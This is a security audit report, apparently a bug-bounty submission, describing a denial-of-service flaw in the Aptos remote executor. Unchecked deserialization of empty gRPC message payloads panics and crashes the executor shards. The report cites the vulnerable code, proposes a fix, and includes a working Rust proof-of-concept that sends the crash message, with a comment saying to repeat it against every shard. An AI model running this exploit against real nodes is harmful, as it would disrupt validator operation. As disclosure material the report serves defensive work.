# Audit Report

## Title
Remote Executor Denial of Service via Empty NetworkMessage Payload

## Summary
The remote executor service's message handlers deserialize incoming NetworkMessage payloads using `bcs::from_bytes().unwrap()` without validating that the message is non-empty. An attacker can send a NetworkMessage with an empty `message` field, causing BCS deserialization to fail and triggering a panic that crashes critical executor components.

## Finding Description

The `NetworkMessage` protobuf structure accepts an arbitrary `bytes` field for the message payload without validation: [1](#0-0) 

The gRPC handler receives these messages and forwards them to registered handlers without checking if the message is empty: [2](#0-1) 

The `Message::new()` constructor accepts any Vec<u8> without validation: [3](#0-2) 

Three critical message handlers attempt to deserialize these messages using `bcs::from_bytes().unwrap()` without checking for empty input:

**1. RemoteCoordinatorClient (MOST CRITICAL):** [4](#0-3) 

This handler is called in a loop by the ShardedExecutorService without panic handling: [5](#0-4) 

**2. RemoteStateViewService:** [6](#0-5) 

**3. RemoteStateValueReceiver:** [7](#0-6) 

**Attack Path:**
1. Attacker sends a gRPC `SimpleMsgExchange` request with `NetworkMessage.message = []` (empty Vec<u8>)
2. The gRPC handler accepts the message and forwards it to the appropriate handler based on `message_type`
3. The handler attempts `bcs::from_bytes(&[])` on the empty slice
4. BCS deserialization fails (cannot deserialize any struct from zero bytes)
5. The `.unwrap()` panics, crashing the thread

**Broken Invariants:**
- **Liveness**: The executor shard stops processing blocks when RemoteCoordinatorClient crashes
- **Availability**: State view services become unavailable, blocking transaction execution

## Impact Explanation

This vulnerability qualifies as **HIGH SEVERITY** under Aptos bug bounty criteria:

- **Validator node slowdowns**: Crashed executor shards prevent the node from processing blocks efficiently
- **API crashes**: The remote executor service becomes unavailable
- **Significant protocol violations**: Disrupts the sharded execution model

The RemoteCoordinatorClient crash is most severe because it runs in the main executor loop without panic recovery. When it panics at line 89 of `remote_cordinator_client.rs`, the entire shard thread terminates, permanently stopping that shard from processing execution commands. If multiple shards are targeted, the entire node's execution capability can be disabled.

The RemoteStateViewService and RemoteStateValueReceiver run in rayon thread pools, so panics are contained but still cause request failures and service degradation.

## Likelihood Explanation

**Likelihood: HIGH**

The attack requires only:
1. Network access to send gRPC requests to the remote executor service endpoint
2. Knowledge of valid `message_type` strings (e.g., `"execute_command_{shard_id}"`, `"remote_kv_request"`)
3. An empty bytes payload

No special privileges, cryptographic keys, or validator access is required. The attacker can trivially craft the malicious message using any gRPC client library. The attack is repeatable and deterministic.

## Recommendation

Add validation to check for empty messages before deserialization:

```rust
// In RemoteCoordinatorClient::receive_execute_command()
match self.command_rx.recv() {
    Ok(message) => {
        if message.data.is_empty() {
            error!("Received empty message for shard {}", self.shard_id);
            return ExecutorShardCommand::Stop;
        }
        let request: RemoteExecutionRequest = match bcs::from_bytes(&message.data) {
            Ok(req) => req,
            Err(e) => {
                error!("Failed to deserialize message for shard {}: {}", self.shard_id, e);
                return ExecutorShardCommand::Stop;
            }
        };
        // ... rest of processing
    }
}
```

Apply the same pattern to RemoteStateViewService::handle_message() and RemoteStateValueReceiver::handle_message(). Additionally, consider adding validation at the gRPC handler level to reject empty messages early.

## Proof of Concept

```rust
use aptos_protos::remote_executor::v1::{NetworkMessage, network_message_service_client::NetworkMessageServiceClient};
use tonic::Request;

#[tokio::main]
async fn main() {
    // Connect to remote executor service
    let mut client = NetworkMessageServiceClient::connect("http://127.0.0.1:50051")
        .await
        .unwrap();
    
    // Craft malicious message with empty payload
    let malicious_msg = NetworkMessage {
        message: vec![], // Empty bytes - causes BCS deserialization to fail
        message_type: "execute_command_0".to_string(), // Target shard 0
    };
    
    // Send the attack message
    let request = Request::new(malicious_msg);
    
    // This will cause RemoteCoordinatorClient to panic and crash shard 0
    match client.simple_msg_exchange(request).await {
        Ok(_) => println!("Attack message sent successfully"),
        Err(e) => println!("Error: {}", e),
    }
    
    // Shard 0 is now crashed and cannot process any execution commands
    // Repeat for other shards to take down the entire node
}
```

## Notes

This vulnerability demonstrates a classic input validation failure where untrusted network input is not sanitized before deserialization. The use of `.unwrap()` on potentially-failing operations in production code is particularly dangerous in network-facing services. The codebase shows awareness of this pattern in other locations (e.g., `types/src/validator_config.rs` properly returns `Result<_, bcs::Error>` without unwrapping), but the remote executor handlers missed this defensive programming practice.

### Citations

**File:** protos/rust/src/pb/aptos.remote_executor.v1.rs (L8-13)
```rust
pub struct NetworkMessage {
    #[prost(bytes="vec", tag="1")]
    pub message: ::prost::alloc::vec::Vec<u8>,
    #[prost(string, tag="2")]
    pub message_type: ::prost::alloc::string::String,
}
```

**File:** secure/net/src/grpc_network_service/mod.rs (L93-115)
```rust
    async fn simple_msg_exchange(
        &self,
        request: Request<NetworkMessage>,
    ) -> Result<Response<Empty>, Status> {
        let _timer = NETWORK_HANDLER_TIMER
            .with_label_values(&[&self.self_addr.to_string(), "inbound_msgs"])
            .start_timer();
        let remote_addr = request.remote_addr();
        let network_message = request.into_inner();
        let msg = Message::new(network_message.message);
        let message_type = MessageType::new(network_message.message_type);

        if let Some(handler) = self.inbound_handlers.lock().unwrap().get(&message_type) {
            // Send the message to the registered handler
            handler.send(msg).unwrap();
        } else {
            error!(
                "No handler registered for sender: {:?} and msg type {:?}",
                remote_addr, message_type
            );
        }
        Ok(Response::new(Empty {}))
    }
```

**File:** secure/net/src/network_controller/mod.rs (L62-70)
```rust
impl Message {
    pub fn new(data: Vec<u8>) -> Self {
        Self { data }
    }

    pub fn to_bytes(self) -> Vec<u8> {
        self.data
    }
}
```

**File:** execution/executor-service/src/remote_cordinator_client.rs (L80-113)
```rust
    fn receive_execute_command(&self) -> ExecutorShardCommand<RemoteStateViewClient> {
        match self.command_rx.recv() {
            Ok(message) => {
                let _rx_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx"])
                    .start_timer();
                let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
                    .with_label_values(&[&self.shard_id.to_string(), "cmd_rx_bcs_deser"])
                    .start_timer();
                let request: RemoteExecutionRequest = bcs::from_bytes(&message.data).unwrap();
                drop(bcs_deser_timer);

                match request {
                    RemoteExecutionRequest::ExecuteBlock(command) => {
                        let init_prefetch_timer = REMOTE_EXECUTOR_TIMER
                            .with_label_values(&[&self.shard_id.to_string(), "init_prefetch"])
                            .start_timer();
                        let state_keys = Self::extract_state_keys(&command);
                        self.state_view_client.init_for_block(state_keys);
                        drop(init_prefetch_timer);

                        let (sub_blocks, concurrency, onchain_config) = command.into();
                        ExecutorShardCommand::ExecuteSubBlocks(
                            self.state_view_client.clone(),
                            sub_blocks,
                            concurrency,
                            onchain_config,
                        )
                    },
                }
            },
            Err(_) => ExecutorShardCommand::Stop,
        }
    }
```

**File:** aptos-move/aptos-vm/src/sharded_block_executor/sharded_executor_service.rs (L215-260)
```rust
    pub fn start(&self) {
        trace!(
            "Shard starting, shard_id={}, num_shards={}.",
            self.shard_id,
            self.num_shards
        );
        let mut num_txns = 0;
        loop {
            let command = self.coordinator_client.receive_execute_command();
            match command {
                ExecutorShardCommand::ExecuteSubBlocks(
                    state_view,
                    transactions,
                    concurrency_level_per_shard,
                    onchain_config,
                ) => {
                    num_txns += transactions.num_txns();
                    trace!(
                        "Shard {} received ExecuteBlock command of block size {} ",
                        self.shard_id,
                        num_txns
                    );
                    let exe_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "execute_block"]);
                    let ret = self.execute_block(
                        transactions,
                        state_view.as_ref(),
                        BlockExecutorConfig {
                            local: BlockExecutorLocalConfig::default_with_concurrency_level(
                                concurrency_level_per_shard,
                            ),
                            onchain: onchain_config,
                        },
                    );
                    drop(state_view);
                    drop(exe_timer);

                    let _result_tx_timer = SHARDED_EXECUTOR_SERVICE_SECONDS
                        .timer_with(&[&self.shard_id.to_string(), "result_tx"]);
                    self.coordinator_client.send_execution_result(ret);
                },
                ExecutorShardCommand::Stop => {
                    break;
                },
            }
        }
```

**File:** execution/executor-service/src/remote_state_view_service.rs (L74-122)
```rust
    pub fn handle_message(
        message: Message,
        state_view: Arc<RwLock<Option<Arc<S>>>>,
        kv_tx: Arc<Vec<Sender<Message>>>,
    ) {
        // we don't know the shard id until we deserialize the message, so lets default it to 0
        let _timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_requests"])
            .start_timer();
        let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_req_deser"])
            .start_timer();
        let req: RemoteKVRequest = bcs::from_bytes(&message.data).unwrap();
        drop(bcs_deser_timer);

        let (shard_id, state_keys) = req.into();
        trace!(
            "remote state view service - received request for shard {} with {} keys",
            shard_id,
            state_keys.len()
        );
        let resp = state_keys
            .into_iter()
            .map(|state_key| {
                let state_value = state_view
                    .read()
                    .unwrap()
                    .as_ref()
                    .unwrap()
                    .get_state_value(&state_key)
                    .unwrap();
                (state_key, state_value)
            })
            .collect_vec();
        let len = resp.len();
        let resp = RemoteKVResponse::new(resp);
        let bcs_ser_timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&["0", "kv_resp_ser"])
            .start_timer();
        let resp = bcs::to_bytes(&resp).unwrap();
        drop(bcs_ser_timer);
        trace!(
            "remote state view service - sending response for shard {} with {} keys",
            shard_id,
            len
        );
        let message = Message::new(resp);
        kv_tx[shard_id].send(message).unwrap();
    }
```

**File:** execution/executor-service/src/remote_state_view.rs (L243-270)
```rust
    fn handle_message(
        shard_id: ShardId,
        message: Message,
        state_view: Arc<RwLock<RemoteStateView>>,
    ) {
        let _timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&[&shard_id.to_string(), "kv_responses"])
            .start_timer();
        let bcs_deser_timer = REMOTE_EXECUTOR_TIMER
            .with_label_values(&[&shard_id.to_string(), "kv_resp_deser"])
            .start_timer();
        let response: RemoteKVResponse = bcs::from_bytes(&message.data).unwrap();
        drop(bcs_deser_timer);

        REMOTE_EXECUTOR_REMOTE_KV_COUNT
            .with_label_values(&[&shard_id.to_string(), "kv_responses"])
            .inc();
        let state_view_lock = state_view.read().unwrap();
        trace!(
            "Received state values for shard {} with size {}",
            shard_id,
            response.inner.len()
        );
        response
            .inner
            .into_iter()
            .for_each(|(state_key, state_value)| {
                state_view_lock.set_state_value(&state_key, state_value);
```
